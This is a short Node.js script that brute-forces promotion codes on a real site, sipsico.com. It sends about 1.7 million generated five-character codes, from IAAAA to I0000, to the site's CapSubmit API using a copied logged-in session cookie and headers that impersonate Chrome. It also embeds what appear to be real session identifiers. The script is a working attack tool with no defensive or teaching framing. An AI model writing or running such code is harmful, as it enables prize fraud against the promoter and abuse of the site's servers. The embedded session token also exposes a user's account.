const axios = require('axios');

const cookies = '_ga=GA1.1.922276811.1749435096; _fbp=fb.1.1749435096649.750018476276410485; connect.sid=s%3ACp6s8j6aqdMZ8lWPAOvdqHt1uvKKyO5L.3HDzmJpAYI4BTqU6IkGZNnMvE4gxqxcCi3d3WQfVAJA; visitor_id=1qlwe8pe; accessToken=...; refreshToken=...; _ga_S3CHWXG0CS=...';

const headers = {
  'accept': 'application/json, text/plain, */*',
  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
  'content-type': 'application/json',
  'cookie': cookies,
  'origin': 'https://sipsico.com',
  'referer': 'https://sipsico.com/user/cap-hunt',
  'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"macOS"',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin',
  'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
};

const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

function* tokenGenerator() {
  const prefix = 'I';
  let indexes = [0, 0, 0, 0]; // Start with IAAAA

  while (true) {
    // Build token
    const token = prefix + indexes.map(i => characters[i]).join('');
    yield token;

    // Stop condition
    if (token === 'I0000') {
      return;
    }

    // Increment indexes (like base-N number)
    for (let i = indexes.length - 1; i >= 0; i--) {
      if (indexes[i] + 1 < characters.length) {
        indexes[i]++;
        break;
      } else {
        indexes[i] = 0;
      }
    }
  }
}

async function sendTokens() {
  const generator = tokenGenerator();

  for (const token of generator) {
    console.log(`Sending token: ${token}`);

    try {
      const response = await axios.post(
        'https://sipsico.com/api/Users/CapSubmit',
        { token },
        { headers }
      );

      console.log(`Response for ${token}:`, response.data);

    } catch (error) {
      console.error(`Error for token ${token}:`, error.response ? error.response.data : error.message);
    }
  }

  console.log('All tokens sent.');
}

sendTokens();
